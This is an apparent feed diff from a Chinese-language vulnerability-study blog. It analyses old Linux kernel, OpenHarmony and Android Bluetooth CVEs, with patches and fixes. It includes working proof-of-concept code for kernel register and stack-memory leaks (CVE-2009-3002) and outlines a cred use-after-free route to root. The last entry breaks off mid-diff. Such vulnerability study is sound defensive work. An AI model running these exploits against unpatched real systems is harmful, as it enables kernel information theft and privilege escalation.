+	&quot;mov _r91, ecx\n&quot;
+	&quot;mov _r92, edx\n&quot;
+	&quot;mov _r101, esi\n&quot;
+	&quot;mov _r102, edi\n&quot;
+	&quot;.att_syntax noprefix\n&quot;
+	&quot;lcall $0x33, $farcalllabel2\n&quot;
+	&quot;.intel_syntax noprefix\n&quot;
+	&quot;mov _r111, eax\n&quot;
+	&quot;mov _r112, ebx\n&quot;
+	&quot;mov _r121, ecx\n&quot;
+	&quot;mov _r122, edx\n&quot;
+	&quot;mov _r131, esi\n&quot;
+	&quot;mov _r132, edi\n&quot;
+	&quot;.att_syntax noprefix\n&quot;
+	&quot;lcall $0x33, $farcalllabel3\n&quot;
+	&quot;.intel_syntax noprefix\n&quot;
+	&quot;mov _r141, eax\n&quot;
+	&quot;mov _r142, ebx\n&quot;
+	&quot;mov _r151, ecx\n&quot;
+	&quot;mov _r152, edx\n&quot;
+	&quot;.att_syntax noprefix\n&quot;
+	);
+
+	printf(&quot; R8=%08x%08x\n&quot;, _r82, _r81);
+	printf(&quot; R9=%08x%08x\n&quot;, _r92, _r91);
+	printf(&quot;R10=%08x%08x\n&quot;, _r102, _r101);
+	printf(&quot;R11=%08x%08x\n&quot;, _r112, _r111);
+	printf(&quot;R12=%08x%08x\n&quot;, _r122, _r121);
+	printf(&quot;R13=%08x%08x\n&quot;, _r132, _r131);
+	printf(&quot;R14=%08x%08x\n&quot;, _r142, _r141);
+	printf(&quot;R15=%08x%08x\n&quot;, _r152, _r151);
+	return 0;
+}
+
+/* ripped from jon oberheide */
+const int randcalls[] = {
+	__NR_read, __NR_write, __NR_open, __NR_close, __NR_stat, __NR_lstat,
+	__NR_lseek, __NR_rt_sigaction, __NR_rt_sigprocmask, __NR_ioctl,
+	__NR_access, __NR_pipe, __NR_sched_yield, __NR_mremap, __NR_dup,
+	__NR_dup2, __NR_getitimer, __NR_setitimer, __NR_getpid, __NR_fcntl,
+	__NR_flock, __NR_getdents, __NR_getcwd, __NR_gettimeofday,
+	__NR_getrlimit, __NR_getuid, __NR_getgid, __NR_geteuid, __NR_getegid,
+	__NR_getppid, __NR_getpgrp, __NR_getgroups, __NR_getresuid,
+	__NR_getresgid, __NR_getpgid, __NR_getsid,__NR_getpriority,
+	__NR_sched_getparam, __NR_sched_get_priority_max
+};
+
+int main(void)
+{
+	/* to keep random stack values from being used for pointers in syscalls */
+	char buf[64] = {};
+	int call;
+	for (call = 0; call &lt; sizeof(randcalls)/sizeof(randcalls[0]); call++) {
+		syscall(randcalls[call]);
+		leak_it();
+	}
+
+}
+</code></pre>
+<h3 id="指令集和语法转换">指令集和语法转换</h3>
+<ol>
+<li><strong>.intel_syntax noprefix</strong>
+<ul>
+<li>这指令改变汇编器解析汇编指令的语法，将其从默认的AT&amp;T语法改为Intel语法。Intel语法是在许多文档和教程中常用的，因为其更加直观。此外，<code>noprefix</code>选项意味着寄存器名称前不需要加<code>%</code>前缀。</li>
+</ul>
+</li>
+<li><strong>.code32</strong>
+<ul>
+<li>这条指令告诉汇编器接下来的代码是32位代码。在32位模式下，CPU的寄存器和操作默认为32位宽。</li>
+</ul>
+</li>
+<li><strong>jmp label1</strong>
+<ul>
+<li>这是一个简单的跳转指令，跳转到标签<code>label1</code>处的代码继续执行。这种方式通常用于控制流程，跳过或延迟执行某些代码块。</li>
+</ul>
+</li>
+</ol>
+<h3 id="32位到64位的转换">32位到64位的转换</h3>
+<ol>
+<li><strong>farcalllabel1:</strong>
+<ul>
+<li>这是一个标签，用作远程调用的目标点。在这里，代码从32位转换到64位执行。</li>
+</ul>
+</li>
+<li><strong>.code64</strong>
+<ul>
+<li>这条指令切换到64位模式，允许汇编代码直接访问和操作64位寄存器。</li>
+</ul>
+</li>
+<li><strong>mov eax, r8d</strong>
+<ul>
+<li>这条指令将64位寄存器R8的低32位移动到32位寄存器EAX。这里的<code>r8d</code>是R8的32位表示。</li>
+</ul>
+</li>
+<li><strong>shr r8, 32</strong>
+<ul>
+<li>这条指令将R8寄存器中的内容向右移动32位，这样原本的高32位现在成为了低32位。</li>
+</ul>
+</li>
+<li><strong>mov ebx, r8d</strong>
+<ul>
+<li>将新的R8的低32位（原高32位）移动到EBX寄存器中。</li>
+</ul>
+</li>
+</ol>
+<h3 id="返回到32位代码">返回到32位代码</h3>
+<ol>
+<li><strong>.att_syntax noprefix</strong>
+<ul>
+<li>汇编代码再次更改语法，这次从Intel语法切换回AT&amp;T语法。这是因为某些平台或工具链默认使用AT&amp;T语法，或者为了与之前的汇编代码保持一致。</li>
+</ul>
+</li>
+<li><strong>lret</strong>
+<ul>
+<li>这是一个远程返回指令，用于从一个远程调用（far call）返回。在这里，它标志着从64位代码返回到32位代码的结束。</li>
+</ul>
+</li>
+</ol>
+<h1 id="the-fix">The Fix</h1>
+<p>如上所示。</p>
+<h1 id="references">References</h1>
+<ul>
+<li>https://jon.oberheide.org/blog/2009/10/04/linux-kernel-x86-64-register-leak/</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2009-3001 — Linux Kernel getname() Stack Memory Disclosures by Jon Oberheide]]></title>
+        <id>https://lzxzl.github.io/post/cve-2009-3001-linux-kernel-getname-stack-memory-disclosures-by-jon-oberheide/</id>
+        <link href="https://lzxzl.github.io/post/cve-2009-3001-linux-kernel-getname-stack-memory-disclosures-by-jon-oberheide/">
+        </link>
+        <updated>2024-05-05T16:26:02.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="the-vulnerability">The Vulnerability</h1>
+<p><code>getname()</code>函数是内核中地址族的一个功能，用于检索有关给定套接字的信息。这些信息以<code>sockaddr</code>结构体的形式存在，可以通过<code>getsockname(2)</code>和<code>getpeername(2)</code>系统调用分别从用户空间访问绑定和连接的套接字。</p>
+<p>一个典型的<code>getname()</code>函数的操作如下：在栈上的一个<code>sockaddr</code>结构体被填充内部套接字结构的地址信息，然后通过<code>memcpy()</code>函数复制到目的地<code>sockaddr</code>中，此后将其复制回用户空间。例如，以下是在<code>net/irda/af_irda.c</code>中<code>irda</code>地址族的<code>getname()</code>函数：</p>
+<pre><code class="language-c">static int irda_getname(struct socket *sock, struct sockaddr *uaddr, int *uaddr_len, int peer)
+{
+    struct sockaddr_irda saddr;
+    struct sock *sk = sock-&gt;sk;
+    struct irda_sock *self = irda_sk(sk);
+
+    // 填充saddr中的几个成员，这是一个sockaddr_irda结构体
+    if (peer) {
+        if (sk-&gt;sk_state != TCP_ESTABLISHED)
+            return -ENOTCONN;
+
+        saddr.sir_family = AF_IRDA;
+        saddr.sir_lsap_sel = self-&gt;dtsap_sel;
+        saddr.sir_addr = self-&gt;daddr;
+    } else {
+        saddr.sir_family = AF_IRDA;
+        saddr.sir_lsap_sel = self-&gt;stsap_sel;
+        saddr.sir_addr = self-&gt;saddr;
+    }
+
+    IRDA_DEBUG(1, &quot;%s(), tsap_sel = %#x\n&quot;, __func__, saddr.sir_lsap_sel);
+    IRDA_DEBUG(1, &quot;%s(), addr = %08x\n&quot;, __func__, saddr.sir_addr);
+
+    /* uaddr_len come to us uninitialised */
+    *uaddr_len = sizeof (struct sockaddr_irda);
+    memcpy(uaddr, &amp;saddr, *uaddr_len); // 通过`memcpy()`函数复制到目的地`sockaddr`中，后面再把uaddr的内容复制到用户空间
+
+    return 0;
+}
+</code></pre>
+<p>查看在<code>include/linux/irda.h</code>中<code>sockaddr_irda</code>结构体的定义：</p>
+<pre><code class="language-c">struct sockaddr_irda {
+    sa_family_t sir_family;   /* AF_IRDA  2Byte*/ 
+    __u8        sir_lsap_sel; /* LSAP selector  1Byte*/
+    __u32       sir_addr;     /* Device address  4Byte */
+    char        sir_name[25]; /* 通常为 &lt;service&gt;:IrDA:TinyTP 25Byte*/
+};
+</code></pre>
+<p>这个结构体总大小为36字节，包括一个较大的25字节<code>sir_name</code>成员。注意，<strong>在上述<code>irda_getname()</code>函数中<code>sir_name</code>成员没有被<code>memset()</code>或初始化</strong>。**这意味着我们最终的<code>memcpy()</code>将会从栈上复制未初始化的数据，然后返回给用户空间，可能泄露敏感信息。**除了25字节的<code>sir_name</code>，编译器还在<code>sir_lsap_sel</code>和<code>sir_addr</code>之间为了对齐目的插入了一个字节的填充，以及在<code>sir_name</code>后还有3字节的填充。这导致总共有29字节的未初始化的内核栈内存被泄漏到用户空间。</p>
+<p>事实证明，这个问题不仅限于<code>irda</code>，还包括<code>can</code>、<code>appletalk</code>、<code>rose</code>、<code>netrom</code>、<code>econet</code>和<code>llc</code>地址族。这些漏洞影响Linux 2.6内核在2.6.31-rc7之前的版本。虽然这些套接字家族不是最常见的，但它们作为模块随通用发行版自动加载，当创建套接字时通过<code>request_module(&quot;net-pf-X&quot;)</code>调用。这是另一个理由说明为什么你应该从你的内核配置中剔除未使用和可能存在漏洞的代码，或使用像grsecurity的MODHARDEN这样的工具来减少你的攻击面。</p>
+<h2 id="小结">小结</h2>
+<p>当看到<strong>未初始化的局部变量结构体</strong>时就要敏感了，如果<strong>只设置其部分内容</strong>，然后进行拷贝和传到用户空间的操作，就会发生<strong>信息泄漏</strong>！</p>
+<h1 id="the-exploit">The Exploit</h1>
+<p>利用这个内存泄露漏洞非常直接和简单，可以由非特权用户执行。对于 <code>irda</code>，我们只需要创建一个 <code>AF_IRDA</code> 套接字，然后对其调用 <code>getsockname(2)</code>。利用其他一些易受攻击的地址族可能需要绑定或连接套接字以满足 <code>getname()</code> 函数中的某些条件。但对于 <code>irda</code>，所需的代码很简单：</p>
+<pre><code class="language-c">struct sockaddr_irda saddr;
+int sock, len = sizeof(saddr);
+sock = socket(AF_IRDA, SOCK_DGRAM, 0);
+getsockname(sock, (struct sockaddr *) &amp;saddr, &amp;len);
+</code></pre>
+<p>现在的 <code>saddr</code> 结构将包含 29 字节的未初始化的内核栈内存（第 4 字节和第 9-36 字节）。</p>
+<p>完整Exploit如下：</p>
+<pre><code class="language-c">/* 
+ * cve-2009-3002.c
+ *
+ * Linux Kernel &lt; 2.6.31-rc7 AF_IRDA getsockname 29-Byte Stack Disclosure
+ * Jon Oberheide &lt;jon@oberheide.org&gt;
+ * http://jon.oberheide.org
+ * 
+ * Information:
+ * 
+ *   http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-3002 
+ *
+ *   The Linux kernel before 2.6.31-rc7 does not initialize certain data 
+ *   structures within getname functions, which allows local users to read 
+ *   the contents of some kernel memory locations by calling getsockname 
+ *   on ... (2) an AF_IRDA socket, related to the irda_getname function in 
+ *   net/irda/af_irda.c.
+ *
+ * Notes:
+ * 
+ *   Yet another stack disclosure...although this one is big and contiguous.
+ */
+
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;time.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/syscall.h&gt;
+
+#ifndef AF_IRDA
+#define AF_IRDA 23 // AF_IRDA 被定义为 23，这是 IRDA（红外数据协会）套接字的地址族标识符
+#endif
+
+struct sockaddr_irda { // 用于存储 IRDA 套接字地址信息
+	uint16_t sir_family;
+	uint8_t sir_lsap_sel;
+	uint32_t sir_addr;
+	char sir_name[25];
+};
+
+const int randcalls[] = {
+	__NR_read, __NR_write, __NR_open, __NR_close, __NR_stat, __NR_lstat,
+	__NR_lseek, __NR_rt_sigaction, __NR_rt_sigprocmask, __NR_ioctl,
+	__NR_access, __NR_pipe, __NR_sched_yield, __NR_mremap, __NR_dup,
+	__NR_dup2, __NR_getitimer, __NR_setitimer, __NR_getpid, __NR_fcntl,
+	__NR_flock, __NR_getdents, __NR_getcwd, __NR_gettimeofday,
+	__NR_getrlimit, __NR_getuid, __NR_getgid, __NR_geteuid, __NR_getegid,
+	__NR_getppid, __NR_getpgrp, __NR_getgroups, __NR_getresuid,
+	__NR_getresgid, __NR_getpgid, __NR_getsid,__NR_getpriority,
+	__NR_sched_getparam, __NR_sched_get_priority_max
+};
+
+void
+dump(const unsigned char *p, unsigned l)
+{
+	printf(&quot;sockaddr_irda:&quot;);
+	while (l &gt; 0) {
+		printf(&quot; &quot;);
+		if (l == 33 || l == 28) {
+			printf(&quot;&lt;&lt;&lt; &quot;);
+		}
+		printf(&quot;%02x&quot;, *p);
+		if (l == 33 || l == 1) {
+			printf(&quot; &gt;&gt;&gt;&quot;);
+		}
+		++p; --l;
+	}
+	printf(&quot;\n&quot;);
+}
+
+int
+main(void)
+{
+	struct sockaddr_irda saddr;
+	int ret, call, sock, len = sizeof(saddr);
+
+	printf(&quot;[+] Creating AF_IRDA socket.\n&quot;);
+
+  //【1】创建一个类型为 AF_IRDA 和 SOCK_DGRAM（数据报套接字）的套接字
+	sock = socket(AF_IRDA, SOCK_DGRAM, 0);
+	if (sock == -1) {
+		printf(&quot;[-] Error: Couldn't create AF_IRDA socket.\n&quot;);
+		printf(&quot;[-] %s.\n&quot;, strerror(errno));
+		exit(1);
+	}
+
+  //【2】使用 memset 将 sockaddr_irda 结构清零，以确保它从干净的状态开始
+	memset(&amp;saddr, 0, len);
+
+	printf(&quot;[+] Ready to call getsockname.\n\n&quot;);
+
+  //【3】实现从 5 到 1 的倒计时，可能是为了准备演示？
+	for (ret = 5; ret &gt; 0; ret--) {
+		printf(&quot;%d...\n&quot;, ret);
+		sleep(1);
+	}
+	srand(time(NULL));
+
+  // 启动循环
+	while (1) {
+    // 【4】在循环中执行随机系统调用。这样做是为了操纵栈并使内存布局“伪有趣”或不可预测，模拟可能已经进行了各种系统调用影响堆栈状态的真实场景。
+		/* random stuff to make stack pseudo-interesting */
+		call = rand() % (sizeof(randcalls) / sizeof(int));
+		syscall(randcalls[call]);
+
+    // 【5】重复调用 getsockname，尝试通过 sockaddr_irda 结构从内核中提取未初始化的内存
+		ret = getsockname(sock, (struct sockaddr *) &amp;saddr, &amp;len);
+		if (ret != 0) {
+			printf(&quot;[-] Error: getsockname failed.\n&quot;);
+			printf(&quot;[-] %s.\n&quot;, strerror(errno));
+			exit(1);
+		}
+
+    //【6】使用 dump 函数将结果打印到标准输出
+		dump((unsigned char *) &amp;saddr, sizeof(saddr));
+	}
+
+	return 0;
+}
+</code></pre>
+<h1 id="the-fix">The Fix</h1>
+<p>修复很简单，在<code>getname()</code>函数开始时对<code>sockaddr</code>结构体使用<code>memset()</code>函数，以确保未初始化的内存不会泄露给用户空间</p>
+<pre><code class="language-c">--- a/net/irda/af_irda.c
++++ b/net/irda/af_irda.c
+@@ -714,6 +714,7 @@ static int irda_getname(struct socket *sock, struct sockaddr *uaddr,
+        struct sock *sk = sock-&gt;sk;
+        struct irda_sock *self = irda_sk(sk);
+
++       memset(&amp;saddr, 0, sizeof(saddr));
+        if (peer) {
+                if (sk-&gt;sk_state != TCP_ESTABLISHED)
+                        return -ENOTCONN;
+</code></pre>
+<h1 id="references">References</h1>
+<ul>
+<li>https://jon.oberheide.org/blog/2009/08/29/linux-kernel-getname-stack-memory-disclosures/</li>
+<li>NVD/CVE: <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-3001">CVE-2009-3001</a></li>
+<li>NVD/CVE: <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-3002">CVE-2009-3002</a></li>
+<li>AF_IRDA exploit: <a href="https://jon.oberheide.org/files/cve-2009-3002.c">cve-2009-3002.c</a></li>
+<li>AF_LLC exploit: <a href="https://jon.oberheide.org/files/cve-2009-3001.c">cve-2009-3001.c</a></li>
+<li>Clement Lecigne's AF_APPLETALK exploit: http://milw0rm.com/exploits/9521</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2023-22436 - Linux内核 - 引用计数]]></title>
+        <id>https://lzxzl.github.io/post/cve-2023-22436-linux-nei-he-yin-yong-ji-shu/</id>
+        <link href="https://lzxzl.github.io/post/cve-2023-22436-linux-nei-he-yin-yong-ji-shu/">
+        </link>
+        <updated>2023-10-24T15:20:21.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>不多说了，都是理由，还是不够自律。2023.10.24</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>漏洞编号</td>
+<td>相关漏洞</td>
+<td>漏洞描述</td>
+<td>漏洞影响</td>
+<td>CVSS3.1基础得分</td>
+<td>受影响的版本</td>
+<td>受影响的仓库</td>
+<td>修复链接</td>
+<td>参考链接</td>
+</tr>
+<tr>
+<td>OpenHarmony-SA-2023-0203</td>
+<td>CVE-2023-22436</td>
+<td>内核子系统中check_permission_for_set_tokenid函数中存在UAF漏洞。</td>
+<td>本地攻击者利用该漏洞攻击可以权限提升，获得root权限。</td>
+<td>7.8</td>
+<td>OpenHarmony-v3.1-Release 到 OpenHarmony-v3.1.5-Release</td>
+<td>kernel_linux_5.10</td>
+<td><a href="https://gitee.com/openharmony/kernel_linux_5.10/pulls/598">3.1.x</a></td>
+<td>研究员上报</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="patch">patch</h2>
+<pre><code class="language-c">  +5 -6 drivers/accesstokenid/access_tokenid.c 
+  @@ -8,7 +8,6 @@
+
+  #define pr_fmt(fmt) &quot;access_token_id: &quot; fmt
+
+- #include &lt;linux/cred.h&gt;
+  #include &lt;linux/errno.h&gt;
+  #include &lt;linux/fs.h&gt;
+  #include &lt;linux/miscdevice.h&gt;
+  @@ -24,7 +23,7 @@ int access_tokenid_get_tokenid(struct file *file, void __user *uarg)
+
+  static bool check_permission_for_set_tokenid(struct file *file)
+  {
+-   const struct cred *cred = get_task_cred(current);
++   kuid_t uid = current_uid();
+    struct inode *inode = file-&gt;f_inode;
+
+    if (inode == NULL) {
+  @@ -32,8 +31,8 @@ static bool check_permission_for_set_tokenid(struct file *file)
+      return false;
+    }
+
+-   if (uid_eq(cred-&gt;uid, GLOBAL_ROOT_UID) ||
+-       uid_eq(cred-&gt;uid, inode-&gt;i_uid)) {
++   if (uid_eq(uid, GLOBAL_ROOT_UID) ||
++       uid_eq(uid, inode-&gt;i_uid)) {
+      return true;
+    }
+
+  @@ -58,7 +57,7 @@ static bool check_permission_for_ftokenid(struct file *file)
+  {
+    int i;
+    struct group_info *group_info;
+-   const struct cred *cred = get_task_cred(current);
++   kuid_t uid = current_uid();
+    struct inode *inode = file-&gt;f_inode;
+
+    if (inode == NULL) {
+  @@ -66,7 +65,7 @@ static bool check_permission_for_ftokenid(struct file *file)
+      return false;
+    }
+
+-   if (uid_eq(cred-&gt;uid, GLOBAL_ROOT_UID))
++   if (uid_eq(uid, GLOBAL_ROOT_UID))
+      return true;
+
+    group_info = get_current_groups();
+
+</code></pre>
+<h2 id="分析">分析</h2>
+<p><code>accesstokenid</code> 驱动提供读写<code>tokenid/ftokenid</code>的能力，两者类似，这里仅分析前者。</p>
+<p><code>[1]</code>处通过<code>get_task_cred()</code>获取当前进程的cred对象，此时cred对象的reference count会加1。但是函数<code>check_permission_for_set_tokenid</code>在后续的过程中，使用完cred对象后并没有将reference count减1（即调用<code>put_cred</code>）。</p>
+<p>那么，如果攻击者一直调用函数<code>check_permission_for_set_tokenid()</code>，那么cred对象的reference count会一直递增1，最后溢出为0，触发释放导致UAF。</p>
+<pre><code class="language-c">static bool check_permission_for_set_tokenid(struct file *file)
+{
+	const struct cred *cred = get_task_cred(current); // [1]
+	struct inode *inode = file-&gt;f_inode;
+
+	if (inode == NULL) {
+		pr_err(&quot;%s: file inode is null\n&quot;, __func__);
+		return false;
+	}
+
+  if (uid_eq(cred-&gt;uid, GLOBAL_ROOT_UID) ||
+      uid_eq(cred-&gt;uid, inode-&gt;i_uid)) {
+		return true;
+	}
+
+	return false;
+}
+</code></pre>
+<p>所有进程都有各自的cred对象（task结构体中），用来描述进程的uid等身份信息，且所有cred对象都存储于名为<code>cred_jar</code>的slab池中。如下所示，一开始<code>attack process</code> 的cred指针指向<code>cred_jar</code>中的第二个cred。</p>
+<pre><code>-------------															-------------
+    cred      --------                   cred(uid==x)
+-------------					|										-------------
+attack process        -----------------&gt; cred(uid==xxx)
+            					   									-------------
+                                         cred(uid==y)
+					              									-------------
+                                         cred(uid==z)
+												            			-------------
+															              cred_jar
+</code></pre>
+<p>接着触发漏洞，让cred对象的reference count溢出为0，触发释放，然而引用并没有销毁，指针仍然指向它。</p>
+<blockquote>
+<p>reference count溢出为0时不会自动释放cred对象，可以通过open &amp; close一个文件来进行释放。open会+1，close会-1并释放。</p>
+</blockquote>
+<pre><code>-------------															-------------
+    cred      --------                   cred(uid==x)
+-------------					|										-------------
+attack process        -----------------&gt; 
+            					   									-------------
+                                         cred(uid==y)
+					              									-------------
+                                         cred(uid==z)
+												            			-------------
+															              cred_jar
+</code></pre>
+<p>最后借助某一个<code>privileged process</code> 进行堆喷，覆盖刚才释放的cred对象，UAF，本地提权到root。</p>
+<pre><code>-------------															-------------
+    cred      --------                   cred(uid==x)
+-------------					|										-------------
+attack process        -----------------&gt; cred(uid==0)
+            					|										-------------
+                                         cred(uid==y)    
+-------------					|										-------------
+    cred      --------                   cred(uid==z)
+-------------															-------------
+privileged process															
+</code></pre>
+<h2 id="参考文献">参考文献</h2>
+<ul>
+<li>https://gitee.com/openharmony/security/blob/master/zh/security-disclosure/2023/2023-02.md</li>
+<li>https://gitee.com/openharmony/kernel_linux_5.10/commit/4048f12d993e0a89e9dda401224f12a99b701052</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2022-20447 - 蓝牙PAN - UAF]]></title>
+        <id>https://lzxzl.github.io/post/cve-2022-20447-lan-ya-pan-uaf/</id>
+        <link href="https://lzxzl.github.io/post/cve-2022-20447-lan-ya-pan-uaf/">
+        </link>
+        <updated>2023-09-18T17:18:08.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>2023.09.19</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>CVE-2022-20447</th>
+<th><a href="https://android.googlesource.com/platform/packages/modules/Bluetooth/+/7281ef11c05226ef0591dab4b6b18af958d260fd">A-233604485</a></th>
+<th>ID</th>
+<th>High</th>
+<th>13</th>
+</tr>
+</thead>
+</table>
+<h2 id="patch"><a href="https://android.googlesource.com/platform/packages/modules/Bluetooth/+/7281ef11c05226ef0591dab4b6b18af958d260fd%5E%21/#F0">patch</a></h2>
+<figure data-type="image" tabindex="1"><img src="https://lzxzl.github.io/post-images/1695057524415.png" alt="" loading="lazy"></figure>
+<h2 id="分析">分析</h2>
+<p>在<code>BNEP_WriteBuf -&gt; bnepu_check_send_packet</code>中，是有场景可能导致<code>p_buf</code>被释放的，但是在从<code>PAN_WriteBuf</code>开始的调用链里，并没有对其做这种情况做检验。最后在[5]处的<code>pcb-&gt;write.octets += p_buf-&gt;len</code>可能导致UAF。<br>
+patch是把UAF的Use给消除掉，即在调用<code>BNEP_WriteBuf</code>之前，先把<code>p_buf-&gt;len</code>给拿出来赋值给局部变量len，那么后面给<code>pcb-&gt;write.octets</code>赋值的时候使用局部变量就不会产生UAF了。<br>
+诶，那么搜一下<code>BNEP_WriteBuf</code>，看看调用它的地方还有没有类似的问题，可惜的是就两处，并没有类似的问题。</p>
+<ul>
+<li>PAN_WriteBuf</li>
+</ul>
+<pre><code class="language-c">// system/stack/pan/pan_api.cc
+/*******************************************************************************
+ *
+ * Function         PAN_WriteBuf
+ *
+ * Description      This sends data over the PAN connections. If this is called
+ *                  on GN or NAP side and the packet is multicast or broadcast
+ *                  it will be sent on all the links. Otherwise the correct link
+ *                  is found based on the destination address and forwarded on
+ *                  it. If the return value is not PAN_SUCCESS, the application
+ *                  should take care of releasing the message buffer.
+ *
+ * Parameters:      handle   - handle for the connection
+ *                  dst      - MAC or BD Addr of the destination device
+ *                  src      - MAC or BD Addr of the source who sent this packet
+ *                  protocol - protocol of the ethernet packet like IP or ARP
+ *                  p_buf    - pointer to the data buffer
+ *                  ext      - to indicate that extension headers present
+ *
+ * Returns          PAN_SUCCESS       - if the data is sent successfully
+ *                  PAN_FAILURE       - if the connection is not found or
+ *                                           there is an error in sending data
+ *
+ ******************************************************************************/
+tPAN_RESULT PAN_WriteBuf(uint16_t handle, const RawAddress&amp; dst,
+                         const RawAddress&amp; src, uint16_t protocol,
+                         BT_HDR* p_buf, bool ext) {
+  ......
+  // [1] 调用BNEP_WriteBuf，传入p_buf
+  result = BNEP_WriteBuf(pcb-&gt;handle, dst, p_buf, protocol, &amp;src, ext); 
+  if (result == BNEP_IGNORE_CMD) {
+    PAN_TRACE_DEBUG(&quot;PAN ignored data buf write to PANU&quot;);
+    pcb-&gt;write.errors++;
+    return PAN_IGNORE_CMD;
+  } else if (result != BNEP_SUCCESS) {
+    PAN_TRACE_ERROR(&quot;PAN failed to send data buf to the PANU&quot;);
+    pcb-&gt;write.errors++;
+    return (tPAN_RESULT)result;
+  }
+  pcb-&gt;write.octets += p_buf-&gt;len; // [5] 在BNEP_WriteBuf中，p_buf可能已经释放了，这里仍然使用，可能造成UAF
+  pcb-&gt;write.packets++;
+  PAN_TRACE_DEBUG(&quot;PAN successfully sent data buf to the PANU&quot;);
+  return PAN_SUCCESS;
+}
+
+
+</code></pre>
+<ul>
+<li><code>BNEP_WriteBuf</code></li>
+</ul>
+<pre><code class="language-c">// system/stack/bnep/bnep_api.cc
+tBNEP_RESULT BNEP_WriteBuf(uint16_t handle, const RawAddress&amp; p_dest_addr,
+                           BT_HDR* p_buf, uint16_t protocol,
+                           const RawAddress* p_src_addr, bool fw_ext_present) {
+    ......
+  /* Send the data or queue it up */
+  bnepu_check_send_packet(p_bcb, p_buf); // [2] 调用bnepu_check_send_packet，传入p_buf
+  return (BNEP_SUCCESS); // [4] 没有对bnepu_check_send_packet中释放p_buf的情况做检查，直接返回BNEP_SUCCESS
+}
+</code></pre>
+<ul>
+<li><code>bnepu_check_send_packet</code></li>
+</ul>
+<pre><code class="language-c">// system/stack/bnep/bnep_utils.cc
+/*******************************************************************************
+ *
+ * Function         bnepu_check_send_packet
+ *
+ * Description      This function tries to send a packet to L2CAP.
+ *                  If L2CAP is flow controlled, it enqueues the
+ *                  packet to the transmit queue
+ *
+ * Returns          void
+ *
+ ******************************************************************************/
+void bnepu_check_send_packet(tBNEP_CONN* p_bcb, BT_HDR* p_buf) {
+  LOG_DEBUG(&quot;BNEP - bnepu_check_send_packet for CID: 0x%x&quot;, p_bcb-&gt;l2cap_cid);
+  if (p_bcb-&gt;con_flags &amp; BNEP_FLAGS_L2CAP_CONGESTED) {
+    if (fixed_queue_length(p_bcb-&gt;xmit_q) &gt;= BNEP_MAX_XMITQ_DEPTH) {
+      LOG_WARN(&quot;BNEP - congested, dropping buf, CID: 0x%x&quot;, p_bcb-&gt;l2cap_cid);
+      osi_free(p_buf); // [3] 满足上述条件时，会释放p_buf
+    } else {
+      fixed_queue_enqueue(p_bcb-&gt;xmit_q, p_buf);
+    }
+  } else {
+    L2CA_DataWrite(p_bcb-&gt;l2cap_cid, p_buf);
+  }
+}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2022-20410 - 蓝牙 - 整数溢出->OOB Read]]></title>
+        <id>https://lzxzl.github.io/post/cve-2022-20410-lan-ya-zheng-shu-yi-chu-greateroob-read/</id>
+        <link href="https://lzxzl.github.io/post/cve-2022-20410-lan-ya-zheng-shu-yi-chu-greateroob-read/">
+        </link>
+        <updated>2023-09-17T15:01:09.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>2023.09.17</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>CVE-2022-20410</th>
+<th><a href="https://android.googlesource.com/platform/packages/modules/Bluetooth/+/089b7e344fc6b8a342278ec82ea31b74c1532d86">A-205570663</a></th>
+<th>ID</th>
+<th>High</th>
+<th>10, 11, 12, 12L, 13</th>
+</tr>
+</thead>
+</table>
+<h2 id="patch"><a href="https://android.googlesource.com/platform/packages/modules/Bluetooth/+/089b7e344fc6b8a342278ec82ea31b74c1532d86%5E%21/#F0">patch</a></h2>
+<figure data-type="image" tabindex="1"><img src="https://lzxzl.github.io/post-images/1694962887312.png" alt="" loading="lazy"></figure>
+<pre><code class="language-diff">diff --git a/system/stack/avrc/avrc_pars_ct.cc b/system/stack/avrc/avrc_pars_ct.cc
+index 12aee4c..a571042 100644
+--- a/system/stack/avrc/avrc_pars_ct.cc
++++ b/system/stack/avrc/avrc_pars_ct.cc
+@@ -237,7 +237,7 @@
+   }
+   BE_STREAM_TO_UINT8(pdu, p);
+   uint16_t pkt_len;
+-  int min_len = 0;
++  uint16_t min_len = 0;
+   /* read the entire packet len */
+   BE_STREAM_TO_UINT16(pkt_len, p);
+ 
+@@ -380,8 +380,14 @@
+               /* Parse the name now */
+               BE_STREAM_TO_UINT16(attr_entry-&gt;name.charset_id, p);
+               BE_STREAM_TO_UINT16(attr_entry-&gt;name.str_len, p);
++              if (static_cast&lt;uint16_t&gt;(min_len + attr_entry-&gt;name.str_len) &lt;
++                  min_len) {
++                // Check for overflow
++                android_errorWriteLog(0x534e4554, &quot;205570663&quot;);
++              }
++              if (pkt_len - min_len &lt; attr_entry-&gt;name.str_len)
++                goto browse_length_error;
+               min_len += attr_entry-&gt;name.str_len;
+-              if (pkt_len &lt; min_len) goto browse_length_error;
+               attr_entry-&gt;name.p_str = (uint8_t*)osi_malloc(
+                   attr_entry-&gt;name.str_len * sizeof(uint8_t));
